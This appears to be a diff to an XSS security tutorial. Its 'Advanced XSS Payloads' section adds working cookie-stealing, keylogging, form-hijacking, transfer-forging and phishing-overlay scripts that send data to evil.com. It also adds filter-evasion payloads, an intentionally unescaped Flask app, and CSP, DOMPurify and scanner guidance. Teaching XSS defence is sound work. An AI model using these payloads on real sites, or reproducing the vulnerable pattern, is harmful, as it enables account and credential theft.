@@ -132,6 +132,295 @@ The last true sets the HttpOnly flag for the cookie.
 
 ---
 
+## XSS Attack Flow Diagram
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│              Stored XSS Attack Flow                          │
+│                                                              │
+│  1. Attacker posts malicious comment:                        │
+│     <script>fetch('https://evil.com/steal?c='+              │
+│     document.cookie)</script>                                │
+│                                                              │
+│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐       │
+│  │ Attacker  │───>│  Web Server   │───>│   Database    │      │
+│  └──────────┘    └──────────────┘    └──────────────┘       │
+│                                            │                 │
+│  2. Victim views the page with the comment │                 │
+│                                            v                 │
+│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐       │
+│  │  Victim   │<───│  Web Server   │<───│   Database    │      │
+│  │ Browser   │    │  serves page  │    │ returns data  │      │
+│  └──────────┘    └──────────────┘    └──────────────┘       │
+│       │                                                      │
+│       │  3. Browser executes the script                      │
+│       v                                                      │
+│  ┌──────────────┐                                           │
+│  │ evil.com      │  4. Cookie sent to attacker               │
+│  │ receives      │                                           │
+│  │ session cookie│                                           │
+│  └──────────────┘                                           │
+└──────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Advanced XSS Payloads
+
+```html
+<!-- Cookie stealing -->
+<script>
+new Image().src="https://evil.com/steal?c="+document.cookie;
+</script>
+
+<!-- Keylogger injection -->
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('https://evil.com/log?key=' + e.key);
+});
+</script>
+
+<!-- Form hijacking - steal credentials -->
+<script>
+document.forms[0].action = 'https://evil.com/phish';
+</script>
+
+<!-- Session riding - perform actions as victim -->
+<script>
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to: 'attacker', amount: 10000})
+});
+</script>
+
+<!-- Phishing overlay -->
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;
+background:white;z-index:9999">
+<h2>Session expired. Please login again:</h2>
+<form action="https://evil.com/phish">
+Username: <input name="user"><br>
+Password: <input name="pass" type="password"><br>
+<button>Login</button></form></div>
+```
+
+---
+
+## XSS Filter Evasion Techniques
+
+Attackers bypass basic filters using encoding and obfuscation:
+
+```html
+<!-- Case variation -->
+<ScRiPt>alert('XSS')</ScRiPt>
+
+<!-- Event handlers (no script tags needed) -->
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
+<input onfocus="alert('XSS')" autofocus>
+
+<!-- HTML encoding -->
+<a href="javascript:alert('XSS')">Click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')">Click</a>
+
+<!-- Double encoding -->
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+<!-- Template literals (modern JS) -->
+<script>alert`XSS`</script>
+```
+
+This is why blocklist-based filtering is insufficient.
+
+---
+
+## Vulnerable vs Secure: Complete Example
+
+```python
+# VULNERABLE Flask application
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+comments = []
+
+@app.route('/comment', methods=['POST'])
+def add_comment():
+    comment = request.form['comment']
+    comments.append(comment)
+    return 'Comment added'
+
+@app.route('/comments')
+def show_comments():
+    # VULNERABLE: Directly inserting user input into HTML
+    html = '<h1>Comments</h1>'
+    for c in comments:
+        html += f'<p>{c}</p>'  # No escaping!
+    return html
+```
+
+```python
+# SECURE Flask application
+from flask import Flask, request, render_template
+from markupsafe import escape
+
+app = Flask(__name__)
+comments = []
+
+@app.route('/comment', methods=['POST'])
+def add_comment():
+    comment = request.form['comment']
+    comments.append(comment)
+    return 'Comment added'
+
+@app.route('/comments')
+def show_comments():
+    # SECURE: Use templates with auto-escaping
+    return render_template('comments.html', comments=comments)
+    # Jinja2 auto-escapes by default:
+    # <p>{{ comment }}</p>
+    # Converts <script> to &lt;script&gt;
+```
+
+---
+
+## Content Security Policy (CSP) In Depth
+
+```
+# Strict CSP that prevents most XSS
+Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' 'nonce-abc123';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: https:;
+    font-src 'self';
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self';
+    report-uri /csp-report;
+```
+
+```
+┌──────────────────────────────────────────────────┐
+│          CSP Directive Reference                  │
+├──────────────────────────────────────────────────┤
+│  default-src    Fallback for all resource types  │
+│  script-src     JavaScript sources               │
+│  style-src      CSS sources                      │
+│  img-src        Image sources                    │
+│  connect-src    Fetch/XHR/WebSocket targets      │
+│  frame-src      iframe sources                   │
+│  font-src       Font file sources                │
+│  object-src     Plugin content (Flash, etc.)     │
+│  base-uri       Restrict <base> tag              │
+│  form-action    Restrict form submission targets │
+│  report-uri     Where to send violation reports  │
+└──────────────────────────────────────────────────┘
+```
+
+---
+
+## Nonce-Based CSP for Inline Scripts
+
+```html
+<!-- Server generates a random nonce per request -->
+<!-- HTTP Header: Content-Security-Policy: script-src 'nonce-abc123' -->
+
+<!-- This WILL execute (has correct nonce) -->
+<script nonce="abc123">
+    console.log("Legitimate script");
+</script>
+
+<!-- This will NOT execute (no nonce / wrong nonce) -->
+<script>
+    alert("XSS attempt blocked by CSP!");
+</script>
+
+<!-- Injected by attacker - also blocked -->
+<script nonce="guessed-wrong">
+    document.location = "https://evil.com";
+</script>
+```
+
+---
+
+## Real-World XSS Case Studies
+
+| Incident          | Year | Impact                                     |
+|-------------------|------|--------------------------------------------|
+| Samy Worm (MySpace)| 2005 | 1M friend requests in 20 hours via stored XSS|
+| Twitter StalkDaily | 2009 | Self-propagating XSS worm on Twitter        |
+| eBay              | 2015 | Stored XSS in product listings              |
+| British Airways   | 2018 | Magecart XSS stole 380K payment cards       |
+| Fortnite          | 2019 | XSS could hijack player accounts            |
+
+---
+
+## Automated XSS Detection
+
+```bash
+# OWASP ZAP - automated scanner
+# zap-cli active-scan http://target.com
+
+# Burp Suite Scanner - commercial tool
+# Excellent at finding reflected and stored XSS
+
+# XSStrike - dedicated XSS scanner
+# python3 xsstrike.py -u "http://target.com/search?q=test"
+
+# Dalfox - parameter analysis and XSS scanning
+# dalfox url "http://target.com/search?q=test"
+
+# Static analysis
+# For JavaScript: ESLint with security plugin
+# npm install eslint-plugin-security
+# For Python: bandit
+# For PHP: phpcs-security-audit
+```
+
+---
+
+## DOMPurify: Client-Side Sanitization
+
+```javascript
+// Install: npm install dompurify
+import DOMPurify from 'dompurify';
+
+// Sanitize user-generated HTML content
+const dirty = '<img src=x onerror=alert("XSS")><b>Bold text</b>';
+const clean = DOMPurify.sanitize(dirty);
+// Result: '<b>Bold text</b>'
+// The malicious img tag is stripped
+
+// Allow specific tags
+const config = {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+    ALLOWED_ATTR: ['href', 'title']
+};
+const safeHTML = DOMPurify.sanitize(userInput, config);
+```
+
+---
+
+## Exercise: XSS Lab
+
+1. Build a vulnerable comment board (Flask/Express)
+2. Demonstrate all three XSS types:
+   - Reflected: Search parameter echoed without encoding
+   - Stored: Comment with `<script>` tag saved to database
+   - DOM-based: Fragment identifier used in `innerHTML`
+3. Craft payloads that:
+   - Steal cookies and send to your listener (`nc -l 8888`)
+   - Inject a fake login form
+   - Modify page content
+4. Implement defenses one at a time and test each:
+   - Output encoding (template auto-escaping)
+   - Content Security Policy header
+   - HttpOnly cookie flag
+   - DOMPurify for user-generated HTML
+5. Test with XSStrike to verify all XSS vectors are closed
+
 ## Conclusion
 
 XSS is a critical security vulnerability that can have severe consequences. Web developers must implement appropriate security measures, including input validation, output encoding, CSP, secure coding practices, and regular security testing to prevent XSS attacks and protect their applications and users.
